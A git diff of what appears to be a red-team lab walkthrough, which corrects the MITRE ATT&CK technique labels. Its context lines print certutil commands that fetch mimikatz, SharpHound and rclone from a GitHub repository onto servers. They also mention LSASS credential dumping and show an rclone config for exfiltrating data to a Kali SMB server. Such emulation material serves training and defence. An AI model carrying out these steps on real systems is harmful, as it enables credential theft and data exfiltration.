@@ -77,7 +77,7 @@ Is Windows Defender running?
 ```PowerShell
 [ITSERVER:PowerShell] Get-MpComputerStatus
 ```
-ATT&CK Techniques: `?`
+ATT&CK Techniques: `T1057`
 
 ### Security tools tampering
 
@@ -111,7 +111,7 @@ We can transfer the tool using `certutil`
 ```PowerShell
 [ITSERVER:PowerShell] certutil -urlcache -f https://github.com/MihhailSokolov/SecTools/raw/main/mimikatz.exe C:\Temp\m.exe
 ```
-ATT&CK Techniques: `T1005`
+ATT&CK Techniques: `T1105`
 
 And then execute it to dump the credentials from LSASS process (make sure PowerShell is running with admin privileges)
 
@@ -152,7 +152,7 @@ We can download the data collector with `certutil` as before
 ```PowerShell
 [ITSERVER:PowerShell] certutil -urlcache -f https://github.com/MihhailSokolov/SecTools/raw/main/SharpHound.exe C:\Temp\sh.exe
 ```
-ATT&CK Techniques: `T1005`
+ATT&CK Techniques: `T1105`
 
 And then run it to collect all data about the domain, its users, computers, groups and their privileges
 
@@ -172,7 +172,7 @@ Let's download `rclone` executable on the system first:
 ```PowerShell
 [ITSERVER:PowerShell] certutil -urlcache -f https://github.com/MihhailSokolov/SecTools/raw/main/rclone.exe C:\Temp\r.exe
 ```
-ATT&CK Techniques: `T1005`
+ATT&CK Techniques: `T1105`
 
 > [!IMPORTANT]
 > When saving the file in Notepad select "Save as" and "Save as type: All files" so no .txt is appended to the filename.
@@ -187,7 +187,7 @@ host = 10.0.1.30
 user = user
 pass = KN_sSidIRaFo_cmcZ_YNa5o8SLfyli8
 ```
-ATT&CK Techniques: `?`
+ATT&CK Techniques: `T1105` `T1564` `T1048`
 
 In the meantime, on our Kali machine, we will create a `loot` folder and start an SMB server with it:
 
@@ -240,7 +240,7 @@ Usually it comes with RSAT AD tools, but we can also get it directly from the Mi
 [ITSERVER:PowerShell] certutil -urlcache -f https://github.com/MihhailSokolov/SecTools/raw/main/PowerShellActiveDirectory.dll C:\Temp\a.dll
 [ITSERVER:PowerShell] Import-Module C:\Temp\a.dll
 ```
-ATT&CK Techniques: `T1005`
+ATT&CK Techniques: `T1105`
 
 `GenericWrite` persmissions that we have on our compormised account mean that we can add ourselves to the `ITSupport` group. Let's do that!
 
@@ -287,7 +287,7 @@ We can now download the `rclone` executable:
 ```PowerShell
 [FINSERVER:PowerShell] certutil -urlcache -f https://github.com/MihhailSokolov/SecTools/raw/main/rclone.exe C:\Temp\r.exe
 ```
-ATT&CK Techniques: `T1005`
+ATT&CK Techniques: `T1105`
 
 And create a config file `C:\Temp\r.conf`:
 
@@ -299,7 +299,7 @@ host = 10.0.1.30
 user = user
 pass = KN_sSidIRaFo_cmcZ_YNa5o8SLfyli8
 ```
-ATT&CK Techniques: `?`
+ATT&CK Techniques: `T1105` `T1564` `T1048`
 
 Then we start the SMB server on Kali:
 
